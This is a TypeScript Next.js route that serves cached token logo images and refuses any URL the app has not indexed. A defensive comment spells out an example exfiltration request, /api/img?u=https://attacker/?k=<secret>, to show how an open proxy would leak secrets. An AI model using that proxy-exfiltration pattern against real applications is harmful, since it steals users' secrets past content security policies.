import { NextResponse } from "next/server";
import { cached, recentlyFailed, resolveImage } from "@/lib/feed/images";
import { isKnownLogo } from "@/lib/feed/query";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

/**
 * Serves token artwork from the shared cache, fetching it if the launch sweep
 * has not warmed it yet. Resolution, gateway fallback and the private-address
 * guard all live in lib/feed/images.
 */
export async function GET(req: Request) {
  const raw = new URL(req.url).searchParams.get("u") ?? "";
  if (!raw || raw.length > 512) return new NextResponse(null, { status: 400 });

  /*
   * Only artwork this app has actually indexed.
   *
   * Without this the route is an open forward proxy: it fetched whatever URL
   * it was handed. That is an exfiltration channel that a Content-Security-
   * Policy cannot close, because the request to reach it is same-origin and
   * therefore allowed — a script on the page could call
   * /api/img?u=https://attacker/?k=<secret> and this server would dutifully
   * make that request on its behalf, carrying the secret in the URL.
   *
   * The logo strings come from token contracts and are already stored, so the
   * set of URLs worth proxying is known and finite. Anything else is refused.
   */
  if (!isKnownLogo(raw)) return new NextResponse(null, { status: 403 });

  // A logo that failed everywhere a moment ago is not worth another attempt.
  // Answered immediately so it costs the browser a round trip rather than a
  // connection held open for the whole fetch budget.
  const hit = recentlyFailed(raw) ? null : (cached(raw) ?? (await resolveImage(raw)));
  /*
   * 404 rather than a placeholder: the client falls back to the direct URL and
   * then to its initials tile, which it can do only if this says nothing.
   *
   * Cached, though. An uncached 404 is re-requested on every render by every
   * viewer, and the answer does not change minute to minute.
   */
  if (!hit) {
    return new NextResponse(null, {
      status: 404,
      headers: { "cache-control": "public, max-age=600" },
    });
  }

  return new NextResponse(hit.body, {
    headers: { "content-type": hit.type, "cache-control": "public, max-age=1800" },
  });
}
